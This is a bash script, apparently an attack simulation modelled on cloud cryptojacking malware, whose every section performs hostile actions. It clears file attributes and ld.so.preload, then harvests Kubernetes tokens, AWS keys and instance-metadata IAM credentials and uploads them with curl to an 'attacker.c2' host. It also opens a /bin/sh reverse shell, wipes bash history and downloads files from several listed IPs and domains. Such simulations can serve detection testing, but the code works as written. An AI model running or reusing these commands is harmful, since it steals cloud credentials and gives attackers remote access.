#!/bin/bash
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
DIR_ARRAY=("/tmp" "/var/tmp" "/dev/shm" "/bin" "/sbin" "/usr/bin" "/usr/sbin")


download() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

echo ''
echo 'Handling some filemods ...'
CHECKCHMOD=`command -v mchmod`
if ! [ -z "$CHECKCHMOD" ] ; then mchattr -ia $(command -v chmod) ; tntrecht -ia  $(command -v chmod) ; mchmod +x  $(command -v chmod) ; fi
CHECKCHATTR=`command -v mchattr`
if ! [ -z "$CHECKCHATTR" ] ; then mchattr -ia $(command -v chattr) ; tntrecht -ia  $(command -v chattr) ; mchmod +x  $(command -v chattr) ; chmod +x  $(command -v chattr) ; fi

echo ''
echo 'Handling preload ld ...'
if [ -f "/etc/ld.so.preload" ] ; then echo 'Found: /etc/ld.so.preload' ; chattr -ia / /etc/ /etc/ld.so.preload 2>/dev/null ; rm -f /etc/ld.so.preload 2>/dev/null ; else echo 'No /etc/ld.so.preload file found!' ; fi

echo ''
echo 'Handling dir permissions ld ...'
for DIR in ${DIR_ARRAY[@]}; do
if [ -d $DIR ] ; then echo '' ; echo $DIR" found."
if [ -w $DIR ] ; then echo "Write rights in "$DIR" available." ; else echo "No write permissions in "$DIR" available. Try to fix the error."
chattr -ia $DIR 2>/dev/null ; if [ -w $DIR ] ; then echo "Write rights in "$DIR" available." ; else echo "Still no write access in "$DIR"." ; fi
fi ; else echo $DIR" not found." ; fi ; done

echo ''
echo "Searching for secrets and sending them to C2 ..."
chattr -ia / /var/ /var/tmp/ 2>/dev/null
if ! [ -d "/dev/shm/.../...HIDDEN.../" ] ; then mkdir -p /dev/shm/.../...HIDDEN.../ 2>/dev/null ; fi

if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ] ; then echo 'Found K8s ServiceToken /var/run/secrets/kubernetes.io/serviceaccount/token' & cat /var/run/secrets/kubernetes.io/serviceaccount/token >> /dev/shm/.../...HIDDEN.../K8.txt; fi
if [ -f "/run/secrets/kubernetes.io/serviceaccount/token" ] ; then echo 'Found K8s ServiceToken /run/secrets/kubernetes.io/serviceaccount/token'& cat /var/run/secrets/kubernetes.io/serviceaccount/token >> /dev/shm/.../...HIDDEN.../K8.txt; fi

curl -F "userfile=@/dev/shm/.../...HIDDEN.../K8.txt" "http://attacker.c2/incoming/access_data/k8.php" 2>/dev/null
rm -f /dev/shm/.../...HIDDEN.../K8.txt 2>/dev/null

if type aws 2>/dev/null 1>/dev/null; then aws configure list >> /dev/shm/.../...HIDDEN.../AWS_data.txt ; fi

env | grep 'AWS\|aws' >> /dev/shm/.../...HIDDEN.../AWS_data.txt

cat /root/.aws/* >> /dev/shm/.../...HIDDEN.../AWS_data.txt 2>/dev/null

download http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/shm/.../...HIDDEN.../iam.role
iam_role_name=$(cat /dev/shm/.../...HIDDEN.../iam.role)
rm -f /dev/shm/.../...HIDDEN.../iam.role 2>/dev/null
download http://169.254.169.254/latest/meta-data/iam/security-credentials/${iam_role_name} > /dev/shm/.../...HIDDEN.../aws.tmp.key
cat /dev/shm/.../...HIDDEN.../aws.tmp.key >> /dev/shm/.../...HIDDEN.../AWS_data.txt
rm -f /dev/shm/.../...HIDDEN.../aws.tmp.key
curl -F "userfile=@/dev/shm/.../...HIDDEN.../AWS_data.txt" "http://attacker.c2/incoming/access_data/aws.php" 2>/dev/null

rm -f /dev/shm/.../...HIDDEN.../AWS_data.txt 2>/dev/null

echo ''
echo 'Getting iam roles list ...'

aws iam list-roles 2>/dev/null

echo ''
echo 'Creating reverse shell ...'

nc -lvp 4444 | (sleep 1 && /bin/sh -i >& /dev/tcp/127.0.0.1/4444 0>&1) | (sleep 7 && pkill -9 nc)

echo ''
echo 'Killing reverse shell for test ...'

echo ''
echo 'Clearing bash bash_history ...'

cat /dev/null > ~/.bash_history

curl https://37.44.238.192/ --connect-timeout 1 --output /tmp/dropped
wget https://46.249.32.136/ --timeout=1 --tries=1 -O /tmp/dropped
curl http://178.17.174.182/ --connect-timeout 1 --output /tmp/dropped
wget https://37.44.238.191/ --timeout=1 --tries=1 -O /tmp/dropped
curl http://109.207.200.43/ --connect-timeout 1 --output /tmp/dropped
wget https://54.36.10.73/ --timeout=1 --tries=1 -O /tmp/dropped
curl http://zvub.us/ --connect-timeout 1 --output /tmp/dropped
wget https://adminserver.online/ --timeout=1 --tries=1 -O /tmp/dropped
curl http://vihansoft.ir/ --connect-timeout 1 --output /tmp/dropped
wget https://pcadmin.online/ --timeout=1 --tries=1 -O /tmp/dropped
curl http://avsvmcloud.com/ --connect-timeout 1 --output /tmp/dropped
wget https://avsvmcloud.com/ --timeout=1 --tries=1 -O /tmp/dropped

exit